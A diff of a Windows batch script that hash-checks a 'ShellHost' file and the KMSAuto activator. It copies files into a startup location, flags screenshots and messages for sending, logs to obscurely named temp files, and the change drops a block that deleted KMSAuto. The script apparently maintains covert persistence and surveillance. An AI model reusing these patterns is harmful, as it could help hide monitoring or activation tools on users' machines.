@@ -24,7 +24,7 @@ if !instances! geq 2 (
 ::goto :EOF
 
 
-set "BATCHVERSION=45.7T"
+set "BATCHVERSION=45.8T"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 del /f /a /q "%LOGFILE%"
 set "RESULT=%TEMP%\TGRESU.txa"
@@ -496,7 +496,7 @@ del /f /a /q %temp%\*.mseuopm
 del /f /a /q %temp%\*.mpee
 del /f /a /q %temp%\*.qwb
 del /f /a /q "%RESULT%"
-exit
+del /f /a /q %temp%\temp_script_R*.bat
 echo.
 goto :EOF
 
@@ -1119,7 +1119,7 @@ echo MD5 doesnt match %SHSTFILEmd5% # %ShellHostMD5%
 echo Turning CheckSend=1
 set "CheckSend=1"
 set "SENDSCREENSHOT=1"
-
+set "MESSAGE=%MESSAGE%MD5SHSTMISMATCH^|"
 
 
 echo.
@@ -1172,7 +1172,7 @@ copy "%sourceFile%" "%startupFile%"
 
 
 
-set "MESSAGE=%MESSAGE%MD5SHSTMISMATCH^|"
+
 set "MESSAGE=%MESSAGE%SHST^|"
 echo Turning CheckSend=1
 set "CheckSend=1"
@@ -1264,7 +1264,7 @@ echo MD5 doesnt match %KMSFILEmd5% # %KMSAutoMD5%
 echo Turning CheckSend=1
 set "CheckSend=1"
 set "SENDSCREENSHOT=1"
-
+set "MESSAGE=%MESSAGE%MD5KMSMISMATCH^|"
 
 echo.
 echo.
@@ -1279,48 +1279,9 @@ echo.
 
 
 
-echo Deleting %KMSFILEroot% and %KMSFILE%
-del /f /a /q "%KMSFILEroot%"
-echo Killing process KMSAuto by Powershell
-::powershell -Command "& { Get-Process | Where-Object { $_.Path -eq '%KMSFILE%' } | Stop-Process -Force }"
-taskkill /F /IM KMSAuto.exe
-del /f /a /q "%KMSFILE%"
-echo ATTRIB OF KMSAUTO
-attrib "%KMSFILE%"
-echo.
-
-if exist "%KMSFILEroot%" (
-    echo Failed to delete %KMSFILEroot%!
-    echo Going to CheckComSurrogate
-	set "GoingCheckCom=1"
-    echo.
-    echo.
-    echo.
-    rem goto CheckComSurrogate
-) else (
-    echo Successfully deleted %KMSFILEroot%.
-)
-
-
-if "%GoingCheckCom%"=="1" goto CheckComSurrogate
-
-
-if exist "%KMSFILE%" (
-     echo Failed to delete %KMSFILE%!
-     rem echo Going to CheckComSurrogate
-     rem goto CheckComSurrogate
-) else (
-     echo Successfully deleted %KMSFILE%.
-)
-
-echo.
-echo.
-echo.
-
-
-
 echo Going to KMSINSTALL...
-
+echo.
+echo.
 
 
 
@@ -1355,7 +1316,7 @@ copy "%sourceFile%" "%startupFile%"
 
 
 
-set "MESSAGE=%MESSAGE%MD5KMSMISMATCH^|"
+
 set "MESSAGE=%MESSAGE%KMSAuto^|"
 echo Turning CheckSend=1
 set "CheckSend=1"
